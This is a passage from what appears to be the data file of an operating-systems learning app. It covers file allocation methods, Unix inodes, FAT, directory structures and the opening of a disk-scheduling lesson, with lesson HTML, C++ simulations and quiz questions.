            {q: 'Which replacement scope can cause cascading page faults across processes?', o: ['Local replacement', 'Global replacement', 'Proportional replacement', 'Equal replacement'], a: 1},
            {q: 'A process accesses pages in pattern: 1,2,3,1,2,3,4,1,2,3,4. The locality set size is:', o: ['2', '3', '4', '11'], a: 2},
          ],
        },
      ],
    },

    // ===== TAB: FILE SYSTEMS =====
    {
      id: 'fs', t: 'File Systems',
      topics: [
        // ----- Topic 0: File Allocation Methods -----
        {
          t: 'File Allocation Methods',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When a database server writes a 100 GB table file, the allocation method determines whether sequential scans read contiguous disk blocks (fast) or chase pointers across the disk (slow). Understanding these methods explains why ext4 uses extents, why FAT is simple but limited, and why SSDs change the trade-offs.</p></div><div class="learn-section"><div class="learn-h">File Allocation Concepts</div><p class="learn-p">When files are stored on disk, the OS must decide how to allocate disk blocks to files. The allocation method significantly impacts performance (sequential and random access speed), storage efficiency (internal/external fragmentation), and reliability.</p></div><div class="learn-section"><div class="learn-h">1. Contiguous Allocation</div><p class="learn-p">Each file occupies a <b>contiguous set of disk blocks</b>. The directory entry stores the <b>starting block</b> and <b>length</b> (number of blocks).</p><p class="learn-p"><b>Advantages:</b></p><ul class="learn-list"><li><b>Excellent sequential access:</b> No seek needed between blocks.</li><li><b>Fast random access:</b> Block i of a file = start + i. <span class="learn-complexity">O(1)</span>.</li><li>Simple implementation.</li></ul><p class="learn-p"><b>Disadvantages:</b></p><ul class="learn-list"><li><b>External fragmentation:</b> As files are created and deleted, free space becomes fragmented.</li><li><b>File growth is difficult:</b> If the blocks after the file are occupied, the file must be relocated.</li><li>Must know the file size at creation time.</li></ul><div class="learn-tip"><b>Tip:</b> Contiguous allocation is used in CD-ROMs and DVDs where files don\'t change after creation.</div></div><div class="learn-section"><div class="learn-h">2. Linked Allocation</div><p class="learn-p">Each file is a <b>linked list of disk blocks</b>. Each block contains a pointer to the next block. The directory entry stores the <b>first block</b> and <b>last block</b> pointers.</p><p class="learn-p"><b>Advantages:</b></p><ul class="learn-list"><li><b>No external fragmentation:</b> Any free block can be used.</li><li>Files can grow dynamically.</li><li>No need to know file size at creation.</li></ul><p class="learn-p"><b>Disadvantages:</b></p><ul class="learn-list"><li><b>Slow random access:</b> To reach block i, must traverse i pointers. <span class="learn-complexity">O(n)</span>.</li><li><b>Pointer overhead:</b> Each block loses space to the pointer (e.g., 4 bytes per 512-byte block = 0.78% overhead).</li><li><b>Reliability:</b> If one pointer is corrupted, the rest of the file is lost.</li></ul><div class="learn-warn"><b>Warning:</b> <b>FAT (File Allocation Table)</b> is an improvement over simple linked allocation. Instead of storing pointers in each block, all pointers are collected into a table (the FAT) kept in memory. This enables faster random access.</div></div><div class="learn-section"><div class="learn-h">3. Indexed Allocation</div><p class="learn-p">Each file has an <b>index block</b> (also called an <b>inode</b> in Unix). The index block contains an array of pointers to the file\'s data blocks. The directory entry points to the index block.</p><p class="learn-p"><b>Advantages:</b></p><ul class="learn-list"><li><b>Fast random access:</b> Block i = index_block[i]. <span class="learn-complexity">O(1)</span>.</li><li>No external fragmentation.</li><li>Files can grow dynamically.</li></ul><p class="learn-p"><b>Disadvantages:</b></p><ul class="learn-list"><li>Overhead of the index block (wasted if file is very small).</li><li>Index block size limits the maximum file size.</li></ul><p class="learn-p"><b>Handling large files:</b></p><ul class="learn-list"><li><b>Linked index blocks:</b> Chain multiple index blocks together.</li><li><b>Multilevel index:</b> Index block points to other index blocks (like multilevel page tables).</li><li><b>Combined scheme (Unix inode):</b> Direct pointers + single indirect + double indirect + triple indirect.</li></ul></div><div class="learn-section"><div class="learn-h">Unix Inode Structure</div><div class="learn-code">// Unix inode (simplified):\n// 12 direct block pointers  -> point directly to data blocks\n// 1 single indirect pointer -> points to a block of pointers\n// 1 double indirect pointer -> points to a block of single indirect blocks\n// 1 triple indirect pointer -> points to a block of double indirect blocks\n//\n// With 4KB blocks and 4-byte pointers (1024 pointers per block):\n// Direct:         12 * 4KB = 48 KB\n// Single indirect: 1024 * 4KB = 4 MB\n// Double indirect: 1024 * 1024 * 4KB = 4 GB\n// Triple indirect: 1024^3 * 4KB = 4 TB\n// Max file size   ~= 4 TB</div></div><div class="learn-section"><div class="learn-h">Comparison of Allocation Methods</div><table class="learn-table"><tr><th>Feature</th><th>Contiguous</th><th>Linked</th><th>Indexed</th></tr><tr><td>Sequential Access</td><td>Excellent</td><td>Good</td><td>Good</td></tr><tr><td>Random Access</td><td><span class="learn-complexity">O(1)</span></td><td><span class="learn-complexity">O(n)</span></td><td><span class="learn-complexity">O(1)</span></td></tr><tr><td>External Fragmentation</td><td>Yes</td><td>No</td><td>No</td></tr><tr><td>File Growth</td><td>Difficult</td><td>Easy</td><td>Easy</td></tr><tr><td>Space Overhead</td><td>None</td><td>Pointer per block</td><td>Index block</td></tr><tr><td>Used In</td><td>CD/DVD</td><td>FAT</td><td>Unix/Linux (ext4)</td></tr></table></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Method</th><th>Random Access</th><th>Sequential Access</th><th>Growth</th><th>Fragmentation</th></tr><tr><td>Contiguous</td><td><span class="learn-complexity">O(1)</span></td><td>Excellent</td><td>Difficult</td><td>External</td></tr><tr><td>Linked</td><td><span class="learn-complexity">O(n)</span></td><td>Good</td><td>Easy</td><td>None</td></tr><tr><td>Indexed (single)</td><td><span class="learn-complexity">O(1)</span></td><td>Good</td><td>Easy</td><td>None</td></tr><tr><td>Indexed (multi-level)</td><td><span class="learn-complexity">O(levels)</span></td><td>Good</td><td>Easy</td><td>None</td></tr><tr><td>Extent-based</td><td><span class="learn-complexity">O(log n)</span></td><td>Excellent</td><td>Easy</td><td>Minimal</td></tr></table><p class="learn-p"><b>Extent-based allocation</b> (ext4, XFS, NTFS) stores files as a series of extents (contiguous block ranges), described by (start_block, length).</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Contiguous allocation and file growth:</b> If adjacent blocks are occupied, the entire file must be relocated.</li><li><b>Linked allocation pointer corruption:</b> If a single pointer in the chain is corrupted, the rest of the file is lost.</li><li><b>Index block overhead for small files:</b> An indexed file needs at least one extra block even for a 1-byte file. Unix inodes mitigate with direct pointers.</li><li><b>SSD changes the calculus:</b> SSDs have negligible seek time, so linked allocation\'s main disadvantage is much less severe.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>Contiguous</th><th>Linked</th><th>Indexed (Unix inode)</th><th>Extent-based</th></tr><tr><td>Access block i</td><td><span class="learn-complexity">O(1): start + i</span></td><td><span class="learn-complexity">O(i): traverse chain</span></td><td><span class="learn-complexity">O(1) direct; O(levels) indirect</span></td><td><span class="learn-complexity">O(log e): binary search</span></td></tr><tr><td>Append block</td><td><span class="learn-complexity">O(n) if relocation</span></td><td><span class="learn-complexity">O(1)</span></td><td><span class="learn-complexity">O(1) if index has space</span></td><td><span class="learn-complexity">O(1) amortized</span></td></tr><tr><td>Delete file</td><td><span class="learn-complexity">O(1): free range</span></td><td><span class="learn-complexity">O(n): traverse all</span></td><td><span class="learn-complexity">O(blocks): free indexed blocks</span></td><td><span class="learn-complexity">O(extents)</span></td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Compare contiguous, linked, and indexed allocation.</b><br>A: Contiguous: O(1) random access, excellent sequential, but external fragmentation and hard to grow. Linked: no fragmentation, easy growth, but O(n) random access. Indexed: O(1) random access, no fragmentation, but index block overhead.</p><p class="learn-p"><b>Q2: How does Unix inode handle files larger than 12 direct pointers?</b><br>A: With 4 KB blocks: 12 direct = 48 KB. Single indirect (1024 pointers = 4 MB), double indirect (4 GB), triple indirect (4 TB). Small files use only direct pointers.</p><p class="learn-p"><b>Q3: What are extents and why do modern file systems use them?</b><br>A: An extent is a contiguous range (start_block, num_blocks). A 1 GB file needs one extent descriptor instead of 262,144 block pointers. Reduces metadata and improves I/O.</p><p class="learn-p"><b>Q4: Why is FAT still used for USB drives?</b><br>A: Simple, universally supported, low overhead, and well-suited for removable media where cross-platform compatibility matters most.</p><p class="learn-p"><b>Q5: How do SSDs affect file allocation?</b><br>A: SSDs have ~100x lower seek time, reducing the penalty of non-contiguous allocation. But sequential access is still faster. Extent-based remains optimal.</p><p class="learn-p"><b>Q6: Calculate the max file size with double indirect pointers (4KB blocks, 4-byte pointers).</b><br>A: Each block holds 4096/4 = 1024 pointers. Double indirect: 1024 * 1024 * 4KB = 4 GB. Total with all levels: 48KB (direct) + 4MB (single) + 4GB (double) + 4TB (triple) ≈ 4 TB.</p><p class="learn-p"><b>Q7: Why do modern file systems use extents instead of block-level indexing?</b><br>A: A 1 GB file with 4KB blocks needs 262,144 block pointers with indexing but just one extent descriptor (start, length). Extents reduce metadata overhead dramatically and improve sequential I/O.</p></div>',
          code: `// File Allocation Methods Simulation in C++
#include <iostream>
#include <vector>
#include <unordered_map>
#include <list>
using namespace std;

const int DISK_SIZE = 50; // 50 blocks on disk
bool diskBlocks[DISK_SIZE]; // true = allocated

// ===== CONTIGUOUS ALLOCATION =====
struct ContiguousFile {
    string name;
    int start, length;
};

class ContiguousAlloc {
    vector<ContiguousFile> files;
public:
    ContiguousAlloc() { fill(diskBlocks, diskBlocks + DISK_SIZE, false); }

    bool allocate(string name, int length) {
        // First-fit: find first contiguous hole of size >= length
        int count = 0, start = -1;
        for (int i = 0; i < DISK_SIZE; i++) {
            if (!diskBlocks[i]) {
                if (count == 0) start = i;
                count++;
                if (count == length) {
                    for (int j = start; j < start + length; j++)
                        diskBlocks[j] = true;
                    files.push_back({name, start, length});
                    cout << "Contiguous: " << name << " at blocks "
                         << start << "-" << start + length - 1 << endl;
                    return true;
                }
            } else {
                count = 0;
            }
        }
        cout << "Contiguous: No space for " << name << endl;
        return false;
    }

    // Random access: O(1)
    int accessBlock(string name, int blockIndex) {
        for (auto& f : files) {
            if (f.name == name) {
                if (blockIndex < f.length)
                    return f.start + blockIndex;
                return -1;
            }
        }
        return -1;
    }
};

// ===== LINKED ALLOCATION =====
struct LinkedBlock {
    int next; // -1 = end of file
};

class LinkedAlloc {
    LinkedBlock blocks[DISK_SIZE];
    unordered_map<string, pair<int,int>> files; // name -> (first, last)
    bool used[DISK_SIZE];

public:
    LinkedAlloc() {
        fill(used, used + DISK_SIZE, false);
        for (int i = 0; i < DISK_SIZE; i++) blocks[i].next = -1;
    }

    int findFreeBlock() {
        for (int i = 0; i < DISK_SIZE; i++)
            if (!used[i]) return i;
        return -1;
    }

    bool allocate(string name, int numBlocks) {
        int first = -1, prev = -1;
        cout << "Linked: " << name << " blocks: ";
        for (int i = 0; i < numBlocks; i++) {
            int blk = findFreeBlock();
            if (blk == -1) return false;
            used[blk] = true;
            cout << blk << " ";
            if (first == -1) first = blk;
            if (prev != -1) blocks[prev].next = blk;
            prev = blk;
        }
        blocks[prev].next = -1;
        files[name] = {first, prev};
        cout << endl;
        return true;
    }

    // Random access: O(n) - must traverse the chain
    int accessBlock(string name, int blockIndex) {
        if (files.find(name) == files.end()) return -1;
        int blk = files[name].first;
        for (int i = 0; i < blockIndex && blk != -1; i++)
            blk = blocks[blk].next;
        return blk;
    }
};

// ===== INDEXED ALLOCATION =====
class IndexedAlloc {
    bool used[DISK_SIZE];
    unordered_map<string, int> fileIndex; // name -> index block
    vector<int> indexBlocks[DISK_SIZE];    // index block -> data blocks

public:
    IndexedAlloc() { fill(used, used + DISK_SIZE, false); }

    int findFreeBlock() {
        for (int i = 0; i < DISK_SIZE; i++)
            if (!used[i]) return i;
        return -1;
    }

    bool allocate(string name, int numBlocks) {
        int idxBlock = findFreeBlock();
        if (idxBlock == -1) return false;
        used[idxBlock] = true;

        cout << "Indexed: " << name << " index=" << idxBlock
             << " data=";
        for (int i = 0; i < numBlocks; i++) {
            int blk = findFreeBlock();
            if (blk == -1) return false;
            used[blk] = true;
            indexBlocks[idxBlock].push_back(blk);
            cout << blk << " ";
        }
        fileIndex[name] = idxBlock;
        cout << endl;
        return true;
    }

    // Random access: O(1)
    int accessBlock(string name, int blockIndex) {
        if (fileIndex.find(name) == fileIndex.end()) return -1;
        int idx = fileIndex[name];
        if (blockIndex < (int)indexBlocks[idx].size())
            return indexBlocks[idx][blockIndex];
        return -1;
    }
};

int main() {
    cout << "=== Contiguous Allocation ===" << endl;
    ContiguousAlloc ca;
    ca.allocate("file1.txt", 5);
    ca.allocate("file2.txt", 3);
    cout << "file1.txt block[2] = disk block " << ca.accessBlock("file1.txt", 2) << endl;

    cout << "\\n=== Linked Allocation ===" << endl;
    LinkedAlloc la;
    la.allocate("data.csv", 4);
    la.allocate("log.txt", 3);
    cout << "data.csv block[2] = disk block " << la.accessBlock("data.csv", 2) << endl;

    cout << "\\n=== Indexed Allocation ===" << endl;
    IndexedAlloc ia;
    ia.allocate("report.pdf", 5);
    ia.allocate("image.png", 3);
    cout << "report.pdf block[3] = disk block " << ia.accessBlock("report.pdf", 3) << endl;

    return 0;
}`,
          problems: [
            ['File Allocation Methods', 'https://www.geeksforgeeks.org/file-allocation-methods/', 'Easy'],
            ['Extent-based Allocation', 'https://www.geeksforgeeks.org/file-systems-in-operating-system/', 'Medium'],
            ['Inode Structure Calculations', 'https://www.geeksforgeeks.org/unix-file-system/', 'Hard'],
          ],
          mcqs: [
            {q: 'Which file allocation method provides O(1) random access without external fragmentation?', o: ['Contiguous', 'Linked', 'Indexed', 'Both Contiguous and Indexed'], a: 2},
            {q: 'What is the main disadvantage of contiguous allocation?', o: ['Slow sequential access', 'External fragmentation and difficulty growing files', 'High pointer overhead', 'Requires index blocks'], a: 1},
            {q: 'In a Unix inode with 12 direct pointers and 4KB blocks, what is the maximum file size using only direct pointers?', o: ['12 KB', '48 KB', '4 MB', '4 GB'], a: 1},
            {q: 'What is the random access time complexity for linked allocation?', o: ['O(1)', 'O(log n)', 'O(n)', 'O(n^2)'], a: 2},
            {q: 'Which allocation method is used in ext4?', o: ['Contiguous', 'Linked list', 'Pure indexed', 'Extent-based (indexed with extents)'], a: 3},
            {q: 'With 4KB blocks and 4-byte pointers, what is the max file size with a single indirect block?', o: ['48 KB', '4 MB', '4 GB', '4 TB'], a: 1},
          ],
        },
        // ----- Topic 1: inode, FAT & Directory Structures -----
        {
          t: 'inode, FAT & Directory Structures',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When you run <code>ls -la</code>, the shell reads directory entries (name to inode mapping), then stat() each inode for permissions, size, and timestamps. When you create a hard link, two directory entries point to the same inode. Understanding inodes, FAT, and directories explains how file systems actually work.</p></div><div class="learn-section"><div class="learn-h">Unix Inode (Index Node)</div><p class="learn-p">The <b>inode</b> is the fundamental data structure in Unix/Linux file systems (ext2, ext3, ext4). Every file and directory has exactly one inode that stores all metadata <b>except the file name</b>.</p><p class="learn-p"><b>Inode contents:</b></p><table class="learn-table"><tr><th>Field</th><th>Description</th></tr><tr><td>File type</td><td>Regular file, directory, symbolic link, etc.</td></tr><tr><td>Permissions</td><td>rwxrwxrwx (owner, group, others)</td></tr><tr><td>Owner (UID)</td><td>User ID of the file owner</td></tr><tr><td>Group (GID)</td><td>Group ID</td></tr><tr><td>File size</td><td>Size in bytes</td></tr><tr><td>Timestamps</td><td>Access time, modification time, change time</td></tr><tr><td>Link count</td><td>Number of hard links pointing to this inode</td></tr><tr><td>Block pointers</td><td>12 direct + 1 single indirect + 1 double indirect + 1 triple indirect</td></tr></table><div class="learn-tip"><b>Tip:</b> The file name is NOT stored in the inode. It is stored in the <b>directory entry</b> along with the inode number. This is why hard links work: multiple directory entries can point to the same inode.</div></div><div class="learn-section"><div class="learn-h">Hard Links vs. Symbolic Links</div><table class="learn-table"><tr><th>Feature</th><th>Hard Link</th><th>Symbolic (Soft) Link</th></tr><tr><td>What it stores</td><td>Same inode number</td><td>Path to the target file</td></tr><tr><td>Cross filesystem?</td><td>No</td><td>Yes</td></tr><tr><td>Link to directory?</td><td>No (usually)</td><td>Yes</td></tr><tr><td>Target deleted?</td><td>File persists until last hard link removed</td><td>Becomes a dangling link</td></tr><tr><td>Inode count</td><td>Increments link count</td><td>Has its own inode</td></tr></table><div class="learn-code">// ln file1.txt hardlink.txt    -> hard link (same inode)\n// ln -s file1.txt symlink.txt  -> symbolic link (different inode)\n// ls -i file1.txt hardlink.txt -> shows same inode number</div></div><div class="learn-section"><div class="learn-h">FAT (File Allocation Table)</div><p class="learn-p"><b>FAT</b> is a simple file system used in MS-DOS, USB drives, and SD cards. Variants: FAT12, FAT16, FAT32, exFAT.</p><p class="learn-p">The <b>File Allocation Table</b> is a table with one entry per disk block. Each entry contains either:</p><ul class="learn-list"><li>The <b>next block number</b> in the chain (linked allocation)</li><li><b>0</b> (free block)</li><li><b>EOF marker</b> (end of file)</li><li><b>Bad block marker</b></li></ul><div class="learn-code">// FAT Example:\n// Block:  0   1   2   3   4   5   6   7\n// FAT:  [EOF  3   0   5   0  EOF  0   0]\n//\n// File A starts at block 0: 0 -> EOF (1 block)\n// File B starts at block 1: 1 -> 3 -> 5 -> EOF (3 blocks)</div><p class="learn-p"><b>Advantages:</b> Simple, widely supported, good for removable media. <b>Disadvantages:</b> No permissions/security, FAT table must be in memory for fast access (can be large), no journaling (prone to corruption on crash).</p></div><div class="learn-section"><div class="learn-h">Directory Structures</div><p class="learn-p">A <b>directory</b> is a special file that contains a list of (name, inode/block) pairs. Common directory structures:</p><p class="learn-p"><b>1. Single-Level Directory:</b> All files in one directory. Simple but name collisions are problematic with multiple users.</p><p class="learn-p"><b>2. Two-Level Directory:</b> Each user has their own directory. Isolates users but no logical grouping within a user\'s files.</p><p class="learn-p"><b>3. Tree-Structured Directory:</b> Hierarchical directory tree (what we use today). Users can create subdirectories. Files are identified by their <b>absolute path</b> (from root) or <b>relative path</b> (from current directory).</p><p class="learn-p"><b>4. Acyclic-Graph Directory:</b> Allows shared subdirectories and files (via hard links or symbolic links). Must handle deletion carefully (reference counting for hard links).</p><p class="learn-p"><b>5. General Graph Directory:</b> Allows cycles. Problematic because file system traversals (e.g., backup) may loop forever. Garbage collection needed to reclaim unreferenced files.</p><div class="learn-warn"><b>Warning:</b> Unix prevents hard links to directories (except for <code>.</code> and <code>..</code>) specifically to avoid cycles in the directory graph. Symbolic links can create apparent cycles, but the OS handles this with a maximum symlink resolution depth.</div></div><div class="learn-section"><div class="learn-h">ext4 File System Features</div><p class="learn-p"><b>ext4</b> is the default Linux file system. Key features:</p><ul class="learn-list"><li><b>Journaling:</b> Logs metadata changes before writing them. On crash, replay the journal to restore consistency.</li><li><b>Extents:</b> Instead of block-by-block mapping, uses extents (contiguous block ranges) for more efficient allocation.</li><li><b>Delayed allocation:</b> Postpones block allocation until data is flushed to disk, allowing better decisions about contiguous placement.</li><li><b>Max file size:</b> 16 TB (with 4KB blocks).</li><li><b>Max filesystem size:</b> 1 EB (exabyte).</li></ul></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>File System</th><th>Metadata Structure</th><th>Max File Size</th><th>Journaling</th><th>Use Case</th></tr><tr><td>ext4</td><td>inode (extents)</td><td>16 TB</td><td>Yes</td><td>Linux default</td></tr><tr><td>XFS</td><td>inode (B+ tree extents)</td><td>8 EB</td><td>Yes (metadata)</td><td>Large files, HPC</td></tr><tr><td>FAT32</td><td>FAT table</td><td>4 GB</td><td>No</td><td>USB drives, SD cards</td></tr><tr><td>exFAT</td><td>FAT table</td><td>16 EB</td><td>No</td><td>Flash media &gt; 32 GB</td></tr><tr><td>NTFS</td><td>MFT (Master File Table)</td><td>16 TB</td><td>Yes</td><td>Windows</td></tr><tr><td>ZFS</td><td>Metadata objects</td><td>16 EB</td><td>COW (no journal needed)</td><td>Servers, NAS</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>File name is NOT in the inode:</b> The name is in the directory entry. This is why hard links work and renaming is O(1).</li><li><b>Hard links cannot cross file system boundaries:</b> Inode numbers are unique within a file system. Symbolic links can cross.</li><li><b>Deleting an open file:</b> Removing the last hard link to an open file does not free data immediately. Data persists until the last file descriptor is closed.</li><li><b>Running out of inodes:</b> A file system can run out of inodes with free disk space. Systems with millions of small files hit this.</li><li><b>FAT has no permissions:</b> No concept of Unix-style permissions or ACLs.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>inode-based (ext4)</th><th>FAT32</th></tr><tr><td>Open file by path</td><td><span class="learn-complexity">O(path_depth * dir_size)</span></td><td><span class="learn-complexity">O(path_depth * dir_size)</span></td></tr><tr><td>Read file metadata</td><td><span class="learn-complexity">O(1) &mdash; read inode</span></td><td><span class="learn-complexity">O(1) &mdash; read directory entry</span></td></tr><tr><td>Random block access</td><td><span class="learn-complexity">O(1) direct, O(levels) indirect</span></td><td><span class="learn-complexity">O(n) FAT chain traversal</span></td></tr><tr><td>Create hard link</td><td><span class="learn-complexity">O(1) &mdash; add dir entry, increment link count</span></td><td>Not supported</td></tr><tr><td>Recovery after crash</td><td>Journal replay: O(journal_size)</td><td>fsck: O(disk_size)</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Hard link vs symbolic link?</b><br>A: A hard link is another directory entry pointing to the SAME inode. Deleting the original does not affect it. A symbolic link is a separate file containing the PATH. Deleting the target makes the symlink dangle. Hard links cannot cross file systems; symlinks can.</p><p class="learn-p"><b>Q2: Why is the file name not stored in the inode?</b><br>A: Separating names from metadata enables hard links: multiple entries can point to the same inode. Renaming is O(1) and does not touch the inode.</p><p class="learn-p"><b>Q3: What happens when you delete a file in Unix?</b><br>A: Directory entry removed, inode link count decremented. If count reaches 0 AND no process has it open, inode and blocks are freed.</p><p class="learn-p"><b>Q4: What is journaling?</b><br>A: Journaling logs metadata changes before applying them. On crash, the journal is replayed for consistency. Without it, a full fsck scan is needed (can take hours).</p><p class="learn-p"><b>Q5: How does FAT differ from inode-based systems?</b><br>A: FAT uses a single table mapping each block to the next in a chain. No inode, no permissions, no hard links, no journaling. Its simplicity makes it universal for removable media.</p><p class="learn-p"><b>Q6: What happens when you delete an open file in Unix?</b><br>A: The directory entry is removed and the link count drops to 0, but the inode and data blocks are NOT freed until the last file descriptor referencing the file is closed. The process can continue reading/writing normally.</p><p class="learn-p"><b>Q7: How does ext4 journaling provide crash recovery?</b><br>A: Before writing metadata to its final location, ext4 writes the change to a journal (write-ahead log). On crash, the journal is replayed: complete entries are applied, incomplete ones are discarded. This avoids the need for a full fsck scan.</p></div>',
          code: `// Inode and Directory Structure Simulation in C++
#include <iostream>
#include <unordered_map>
#include <vector>
#include <string>
#include <ctime>
using namespace std;

// Simplified inode structure
struct Inode {
    int inodeNum;
    char fileType;      // 'f' = file, 'd' = directory
    string permissions; // e.g., "rwxr-xr-x"
    int uid, gid;       // Owner and group
    int size;           // File size in bytes
    int linkCount;      // Hard link count
    time_t created, modified, accessed;
    vector<int> directBlocks;    // 12 direct block pointers
    int singleIndirect;          // Single indirect block pointer
    int doubleIndirect;          // Double indirect block pointer
};

// Directory entry: name -> inode number
struct DirEntry {
    string name;
    int inodeNum;
};

class SimpleFileSystem {
    int nextInodeNum;
    int nextBlockNum;
    unordered_map<int, Inode> inodeTable;
    unordered_map<int, vector<DirEntry>> directories; // inode -> entries

public:
    SimpleFileSystem() : nextInodeNum(1), nextBlockNum(100) {
        // Create root directory
        createInode('d', "rwxr-xr-x", 0, 0);
        directories[1] = {{"..", 1}, {".", 1}};
        cout << "File system initialized. Root inode = 1" << endl;
    }

    int createInode(char type, string perms, int uid, int gid) {
        int ino = nextInodeNum++;
        Inode inode;
        inode.inodeNum = ino;
        inode.fileType = type;
        inode.permissions = perms;
        inode.uid = uid;
        inode.gid = gid;
        inode.size = 0;
        inode.linkCount = 1;
        inode.created = inode.modified = inode.accessed = time(NULL);
        inode.singleIndirect = -1;
        inode.doubleIndirect = -1;
        inodeTable[ino] = inode;
        return ino;
    }

    void createFile(int parentInode, string name, int size) {
        int ino = createInode('f', "rw-r--r--", 1000, 1000);
        Inode &inode = inodeTable[ino];
        inode.size = size;

        // Allocate blocks (simplified: 4KB blocks)
        int blocksNeeded = (size + 4095) / 4096;
        for (int i = 0; i < min(blocksNeeded, 12); i++) {
            inode.directBlocks.push_back(nextBlockNum++);
        }
        if (blocksNeeded > 12) {
            inode.singleIndirect = nextBlockNum++;
        }

        // Add to parent directory
        directories[parentInode].push_back({name, ino});
        cout << "Created file '" << name << "' inode=" << ino
             << " size=" << size << " blocks=" << blocksNeeded << endl;
    }

    void createHardLink(int parentInode, string name, int targetInode) {
        if (inodeTable[targetInode].fileType == 'd') {
            cout << "Error: Cannot hard link directories!" << endl;
            return;
        }
        directories[parentInode].push_back({name, targetInode});
        inodeTable[targetInode].linkCount++;
        cout << "Hard link '" << name << "' -> inode " << targetInode
             << " (link count=" << inodeTable[targetInode].linkCount
             << ")" << endl;
    }

    void listDirectory(int dirInode) {
        cout << "\\nDirectory listing (inode " << dirInode << "):" << endl;
        cout << "Inode\\tType\\tPerms\\t\\tLinks\\tSize\\tName" << endl;
        for (auto& entry : directories[dirInode]) {
            Inode& ino = inodeTable[entry.inodeNum];
            cout << ino.inodeNum << "\\t"
                 << (ino.fileType == 'd' ? "DIR" : "FILE") << "\\t"
                 << ino.permissions << "\\t"
                 << ino.linkCount << "\\t"
                 << ino.size << "\\t"
                 << entry.name << endl;
        }
    }

    void showInodeDetails(int inodeNum) {
        if (inodeTable.find(inodeNum) == inodeTable.end()) {
            cout << "Inode not found!" << endl;
            return;
        }
        Inode& ino = inodeTable[inodeNum];
        cout << "\\nInode " << ino.inodeNum << " details:" << endl;
        cout << "  Type: " << (ino.fileType == 'd' ? "Directory" : "File")
             << endl;
        cout << "  Permissions: " << ino.permissions << endl;
        cout << "  UID:GID: " << ino.uid << ":" << ino.gid << endl;
        cout << "  Size: " << ino.size << " bytes" << endl;
        cout << "  Links: " << ino.linkCount << endl;
        cout << "  Direct blocks: ";
        for (int b : ino.directBlocks) cout << b << " ";
        cout << endl;
        if (ino.singleIndirect != -1)
            cout << "  Single indirect: " << ino.singleIndirect << endl;
    }
};

int main() {
    SimpleFileSystem fs;

    // Create files in root directory
    fs.createFile(1, "hello.c", 2048);
    fs.createFile(1, "data.bin", 50000);
    fs.createFile(1, "notes.txt", 512);

    // Create hard link
    fs.createHardLink(1, "hello_link.c", 2); // Link to hello.c

    // List root directory
    fs.listDirectory(1);

    // Show inode details
    fs.showInodeDetails(2); // hello.c
    fs.showInodeDetails(3); // data.bin

    return 0;
}`,
          problems: [
            ['Inode in Operating System', 'https://www.geeksforgeeks.org/inode-in-operating-system/', 'Easy'],
            ['Directory Structures in OS', 'https://www.geeksforgeeks.org/structures-of-directory-in-operating-system/', 'Medium'],
            ['Hard vs Soft Links', 'https://www.geeksforgeeks.org/difference-between-hard-link-and-soft-link/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT stored in a Unix inode?', o: ['File permissions', 'File name', 'File size', 'Block pointers'], a: 1},
            {q: 'What happens when you delete a file that has 2 hard links?', o: ['The file is deleted from disk', 'The link count decreases to 1; file data is preserved', 'Both hard links are removed', 'The file becomes a symbolic link'], a: 1},
            {q: 'In FAT, where is the pointer to the next block of a file stored?', o: ['In the file\'s directory entry', 'In the data block itself', 'In the File Allocation Table', 'In the inode'], a: 2},
            {q: 'Why can\'t hard links cross filesystem boundaries?', o: ['They are too slow', 'Inode numbers are unique only within a filesystem', 'The kernel forbids it', 'They would create cycles'], a: 1},
            {q: 'What is the purpose of journaling in ext4?', o: ['To speed up reads', 'To log metadata changes for crash recovery', 'To encrypt file data', 'To compress file contents'], a: 1},
            {q: 'What is the maximum file size in FAT32?', o: ['2 GB', '4 GB', '16 TB', '1 EB'], a: 1},
          ],
        },
        // ----- Topic 2: Disk Scheduling -----
        {
          t: 'Disk Scheduling',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">A busy database server generates hundreds of disk I/O requests per second. On an HDD with 10 ms average seek time, intelligent disk scheduling (SCAN, C-LOOK) can reduce total seek time by 50-70%, directly improving query throughput. While SSDs have made seek time nearly zero, HDDs are still dominant in data centers for bulk storage.</p></div><div class="learn-section"><div class="learn-h">Disk Structure and Access Time</div><p class="learn-p">A traditional <b>hard disk drive (HDD)</b> consists of platters spinning at high speed (5400&ndash;15000 RPM). Data is read/written by a head that moves across the platter surface. The total time to access data on disk has three components:</p><table class="learn-table"><tr><th>Component</th><th>Description</th><th>Typical Time</th></tr><tr><td>Seek Time</td><td>Time to move the head to the correct track/cylinder</td><td>3&ndash;15 ms</td></tr><tr><td>Rotational Latency</td><td>Time for the desired sector to rotate under the head</td><td>2&ndash;6 ms</td></tr><tr><td>Transfer Time</td><td>Time to transfer the data</td><td>~0.1 ms per sector</td></tr></table><p class="learn-p"><b>Seek time</b> is the dominant factor, so disk scheduling algorithms aim to <b>minimize total seek time</b> by ordering requests intelligently.</p></div><div class="learn-section"><div class="learn-h">FCFS Disk Scheduling</div><p class="learn-p">Requests are serviced in the order they arrive. Fair but can result in large seek distances.</p><p class="learn-p"><b>Example:</b> Head starts at track 53. Request queue: 98, 183, 37, 122, 14, 124, 65, 67.</p><div class="learn-code">Head movement: 53 -> 98 -> 183 -> 37 -> 122 -> 14 -> 124 -> 65 -> 67\nTotal head movement = |53-98| + |98-183| + |183-37| + |37-122|\n                    + |122-14| + |14-124| + |124-65| + |65-67|\n                    = 45 + 85 + 146 + 85 + 108 + 110 + 59 + 2\n                    = 640 tracks</div></div><div class="learn-section"><div 